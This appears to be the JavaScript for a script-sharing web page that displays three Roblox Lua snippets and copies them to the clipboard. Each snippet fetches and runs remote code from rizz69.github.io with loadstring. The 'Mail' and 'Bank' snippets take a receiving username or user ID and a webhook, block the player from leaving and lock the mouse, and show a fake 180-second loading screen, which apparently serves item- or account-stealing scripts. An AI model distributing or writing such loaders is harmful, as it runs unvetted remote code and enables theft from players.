var Visual = `loadstring(game:HttpGetAsync("https://rizz69.github.io/Visual.lua", true))()`;

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('visual').textContent = Visual;
});

var Mail = `UserName = "User Here"
UserName2 = "2nd User Here" -- optional delete the whole line if you don't want it
Webhook = "webhook here" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true
-- set them to false if you don't need them

_G.ScriptName = "Rizz Scriptz"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()`
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('mail').textContent = Mail;
});

var Bank = `_G.UserID = UserID
_G.Webhook = "webhook here" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true
-- set them to false if you don't want them

_G.ScriptName = "Rizz Scriptz"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()`

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('bank').textContent = Bank;
});
function copyToClipboard(code) {
  var el = document.createElement('textarea');
  el.value = code;
  document.body.appendChild(el);
  el.select();
  if (document.execCommand('copy')) {
    alert('Code copied to clipboard!');
  } else {
    alert('Copying to clipboard failed.');
  }
  document.body.removeChild(el);
}
